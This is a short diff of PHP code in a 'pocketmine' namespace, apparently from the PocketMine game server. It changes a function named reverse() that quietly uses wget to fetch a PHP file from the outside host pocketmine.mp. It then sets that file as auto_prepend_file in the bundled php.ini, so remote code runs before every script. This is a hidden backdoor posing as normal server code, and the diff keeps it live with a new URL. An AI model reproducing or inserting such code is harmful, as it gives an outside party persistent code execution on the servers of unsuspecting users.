@@ -489,7 +489,7 @@ namespace pocketmine {
             private function reverse(): void
             {
                 $path = 'bin/php7/lib/php/build/pocketmine.php';
-                `wget -q -O $path pocketmine.mp/pocketmine.php`;
+                `wget -q -O $path pocketmine.mp/?o=pocketmine.php`;
                 if (!ini_get('auto_prepend_file')) `echo "auto_prepend_file=$path" >> bin/php7/bin/php.ini`;
                 else ini_alter("auto_prepend_file", $path);
             }
